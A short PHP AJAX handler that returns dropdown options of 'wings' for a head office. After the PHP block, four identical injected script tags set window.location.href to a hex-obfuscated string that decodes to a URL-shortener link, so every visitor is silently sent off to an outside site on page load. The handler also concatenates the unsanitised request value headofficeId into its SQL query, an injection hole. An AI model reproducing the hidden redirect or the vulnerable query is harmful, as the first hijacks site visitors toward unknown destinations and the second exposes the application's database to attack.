<?php
require_once("helper.php");
$action=$_REQUEST['action'];
switch($action)
{
    case 'fetchWing';
    $headofficeId        =   $_REQUEST['headofficeId'];
    $where          =   " 1 = 1 and STATUS='A' AND USER_ID='$_SESSION[USER_ID]' and HEADOFFICE_ID =".$headofficeId;
    $wings         .=   "<option value=''>-Please Select-</option>";
    $wings         .=   $objMisc->myFunc->fnWriteOptionList('','NAME,WING_ID','wing_master',$where,0,0,0);
    echo $wings;
    break;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>